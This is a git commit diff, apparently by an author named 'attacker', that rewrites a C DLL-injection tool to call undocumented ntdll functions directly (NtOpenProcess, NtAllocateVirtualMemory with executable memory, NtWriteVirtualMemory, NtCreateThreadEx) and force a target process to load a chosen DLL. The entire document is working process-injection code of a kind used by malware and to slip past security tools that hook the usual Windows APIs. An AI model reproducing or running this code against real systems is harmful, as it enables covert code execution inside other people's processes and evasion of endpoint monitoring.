354f8d77ba3650e810f0da99936a85b289cbfe25
attacker <attacker@WIN10>
2025-03-21 15:56:33 +0100

    Full NTAPI

--- grim.h
+++ grim.h
@@ -15,9 +15,56 @@ typedef struct _CLIENT_ID {
     VOID* UniqueThread;                                                     //0x8
 } *PCLIENT_ID, CLIENT_ID;
 
-typedef NTSTATUS(NTAPI* pNtOpenProcess)(
+typedef struct _PS_ATTRIBUTE {
+    ULONG_PTR Attribute;
+    SIZE_T Size;
+    union
+    {
+        ULONG_PTR Value;
+        PVOID ValuePtr;
+    };
+    PSIZE_T ReturnLength;
+} *PPS_ATTRIBUTE, PS_ATTRIBUTE;
+
+typedef struct _PS_ATTRIBUTE_LIST {
+    SIZE_T TotalLength;
+    PS_ATTRIBUTE Attributes[1];
+} *PPS_ATTRIBUTE_LIST, PS_ATTRIBUTE_LIST;
+
+typedef NTSTATUS(NTAPI* pNtOpenProcess) (
     _Out_ PHANDLE ProcessHandle,
     _In_ ACCESS_MASK DesiredAccess,
     _In_ POBJECT_ATTRIBUTES ObjectAttributes,
     _In_opt_ PCLIENT_ID ClientId
     );
+
+typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory) (
+    _In_ HANDLE ProcessHandle,
+    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
+    _In_ ULONG_PTR ZeroBits,
+    _Inout_ PSIZE_T RegionSize,
+    _In_ ULONG AllocationType,
+    _In_ ULONG Protect
+);
+
+typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory) (
+    _In_ HANDLE ProcessHandle,
+    _In_opt_ PVOID BaseAddress,
+    _In_reads_bytes_(BufferSize) PVOID Buffer,
+    _In_ SIZE_T BufferSize,
+    _Out_opt_ PSIZE_T NumberOfBytesWritten
+);
+
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
+    _Out_ PHANDLE ThreadHandle,
+    _In_ ACCESS_MASK DesiredAccess,
+    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+    _In_ HANDLE ProcessHandle,
+    _In_ PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE
+    _In_opt_ PVOID Argument,
+    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
+    _In_ SIZE_T ZeroBits,
+    _In_ SIZE_T StackSize,
+    _In_ SIZE_T MaximumStackSize,
+    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
+);
--- main.c
+++ main.c
@@ -16,46 +16,20 @@ int main(int argc, char* argv[]) {
 	DWORD dwPid;
 	HANDLE hProcess = NULL;
 	LPCSTR lpDllName = argv[2];
-	DWORD dwSize = strlen(lpDllName);
+	
 	HMODULE hKernel32 = NULL;
 	FARPROC fLoadLibraryAddress = NULL;
-	CHAR* cBuffer = NULL;
+	FARPROC fAddressNtOpenProcess = NULL;
+	
 	HANDLE hThread = NULL;
 	SIZE_T sNumberBytesWritten;
 	OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL };
 	CLIENT_ID ci = { NULL, NULL };
+	NTSTATUS status;
 
 	dwPid = ListProcess(cProcessName);
 
-	HANDLE hNtdll = GetModuleHandleA("ntdll");
-	if (hNtdll == NULL) {
-		printf("%s GetModuleHandle failed with error: 0x%x\n", ERROR, GetLastError());
-		return 1;
-	}
-	printf("%s Get handle for NTDLL at address: 0x%p\n", SUCCESS, hNtdll);
-
-	FARPROC fLoadLibraryAddressNtdll;
-	fLoadLibraryAddressNtdll = GetProcAddress(hNtdll, "NtOpenProcess");
-	if (fLoadLibraryAddressNtdll == NULL) {
-		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
-		return 1;
-	}
-	printf("%s Get address for LoadLibrary NtOpenProcess at: 0x%p\n", SUCCESS, fLoadLibraryAddressNtdll);
-
-	pNtOpenProcess customNtOpenProcess = (pNtOpenProcess)fLoadLibraryAddressNtdll;
-
-	ci.UniqueProcess = dwPid;
-	customNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &ci);
-
-	/*
-	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPid);
-	if (hProcess == NULL) {
-		printf("%s OpenProcess failed with error: 0x%x\n", ERROR, GetLastError());
-		return 1;
-	}
-	printf("%s Get handle for process %d at address: 0x%p\n", SUCCESS, dwPid, hProcess);
-	*/
-
+	/*==============================[START OF GET LOADLIBRARY ADDRESS]==============================*/
 	hKernel32 = GetModuleHandleA("kernel32");
 	if (hKernel32 == NULL) {
 		printf("%s GetModuleHandle failed with error: 0x%x\n", ERROR, GetLastError());
@@ -69,31 +43,95 @@ int main(int argc, char* argv[]) {
 		return 1;
 	}
 	printf("%s Get address for LoadLibrary at: 0x%p\n", SUCCESS, fLoadLibraryAddress);
+	/*==============================[END OF GET LOADLIBRARY ADDRESS]==============================*/
 
-	cBuffer = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (cBuffer == NULL) {
-		printf("%s VirtualAllocEx failed with error: 0x%x\n", ERROR, GetLastError());
+	/*==============================[START OF NTOPENPROCESS]==============================*/
+	HANDLE hNtdll = GetModuleHandleA("ntdll");
+	if (hNtdll == NULL) {
+		printf("%s GetModuleHandle failed with error: 0x%x\n", ERROR, GetLastError());
 		return 1;
 	}
-	printf("%s Allocated memory at address: 0x%p\n", SUCCESS, cBuffer);
+	printf("%s Get handle for NTDLL at address: 0x%p\n", SUCCESS, hNtdll);
 
-	if (!WriteProcessMemory(hProcess, cBuffer, lpDllName, dwSize, &sNumberBytesWritten)) {
-		printf("%s WriteProcessMemory failed with error: 0x%x\n", ERROR, GetLastError());
+	fAddressNtOpenProcess = GetProcAddress(hNtdll, "NtOpenProcess");
+	if (fAddressNtOpenProcess == NULL) {
+		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
 		return 1;
 	}
-	printf("%s Successfully writted %zu bytes in memory at address: 0x%p\n", SUCCESS, sNumberBytesWritten, cBuffer);
+	printf("%s Get address for  NtOpenProcess at: 0x%p\n", SUCCESS, fAddressNtOpenProcess);
 
-	hThread = CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)fLoadLibraryAddress, cBuffer, 0, NULL);
-	if (hThread == NULL) {
-		printf("%s CreateRemoteThread failed with error: 0x%x\n", ERROR, GetLastError());
+	pNtOpenProcess customNtOpenProcess = (pNtOpenProcess)fAddressNtOpenProcess;
+
+	ci.UniqueProcess = dwPid;
+	status = customNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &ci);
+	if (status != 0x0) {
+		printf("%s customNtWriteVirtualMemory failed with error: 0x%x\n", ERROR, status);
+		return 1;
+	}
+	printf("%s Successfully get handle for process %s at address: 0x%p\n", SUCCESS, cProcessName, hProcess);
+	/*==============================[END OF NTOPENPROCESS]==============================*/
+	
+	/*==============================[START OF NTALLOCATEVIRTUALMEMORY]==============================*/
+	FARPROC fAddressNtAllocateVirtualMemory;
+	fAddressNtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+	if (fAddressNtAllocateVirtualMemory == NULL) {
+		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
+		return 1;
+	}
+	printf("%s Get address for  NtAllocateVirtualMemory at: 0x%p\n", SUCCESS, fAddressNtAllocateVirtualMemory);
+	
+	PVOID pBuffer = NULL;
+	SIZE_T dwSize = strlen(lpDllName);
+	
+	pNtAllocateVirtualMemory customNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fAddressNtAllocateVirtualMemory;
+	status = customNtAllocateVirtualMemory(hProcess, &pBuffer, NULL, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (status != 0x0) {
+		printf("%s customNtAllocateVirtualMemory failed with error: 0x%x\n", ERROR, status);
+		return 1;
+	}
+	printf("%s Allocated memory at address: 0x%p\n", SUCCESS, pBuffer);
+	/*==============================[END OF NTALLOCATEVIRTUALMEMORY]==============================*/
+
+	/*==============================[START OF NTWRITEVIRTUALMEMORY]==============================*/
+	FARPROC fAddressNtWriteVirtualMemory;
+	fAddressNtWriteVirtualMemory = GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+	if (fAddressNtWriteVirtualMemory == NULL) {
+		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
+		return 1;
+	}
+	printf("%s Get address for  NtWriteVirtualMemory at: 0x%p\n", SUCCESS, fAddressNtWriteVirtualMemory);
+
+	pNtWriteVirtualMemory customNtWriteVirtualMemory = (pNtWriteVirtualMemory)fAddressNtWriteVirtualMemory;
+	status = customNtWriteVirtualMemory(hProcess, pBuffer, lpDllName, dwSize, &sNumberBytesWritten);
+	if (status != 0x0) {
+		printf("%s customNtWriteVirtualMemory failed with error: 0x%x\n", ERROR, status);
+		return 1;
+	}
+	printf("%s Successfully writted %zu bytes in memory at address: 0x%p\n", SUCCESS, sNumberBytesWritten, pBuffer);
+	/*==============================[END OF NTWRITEVIRTUALMEMORY]==============================*/
+
+	/*==============================[START OF NTCREATETHREADEX]==============================*/
+	FARPROC fAddressNtCreateThreadEx;
+	fAddressNtCreateThreadEx = GetProcAddress(hNtdll, "NtCreateThreadEx");
+	if (fAddressNtCreateThreadEx == NULL) {
+		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
+		return 1;
+	}
+	printf("%s Get address for  NtCreateThreadEx at: 0x%p\n", SUCCESS, fAddressNtCreateThreadEx);
+
+	pNtCreateThreadEx customNtCreateThreadEx = (pNtCreateThreadEx)fAddressNtCreateThreadEx;
+	status = customNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, (LPTHREAD_START_ROUTINE)fLoadLibraryAddress, pBuffer, 0, NULL, NULL, NULL, NULL);
+	if (status != 0x0) {
+		printf("%s customNtCreateThreadEx failed with error: 0x%x\n", ERROR, status);
 		return 1;
 	}
 	printf("%s Launched thread at address: 0x%p\n", SUCCESS, hThread);
+	/*==============================[END OF NTCREATETHREADEX]==============================*/
 
 	WaitForSingleObject(hThread, INFINITE);
 
 	CloseHandle(hThread);
 	CloseHandle(hProcess);
-
+	getchar();
 	return 0;
 }
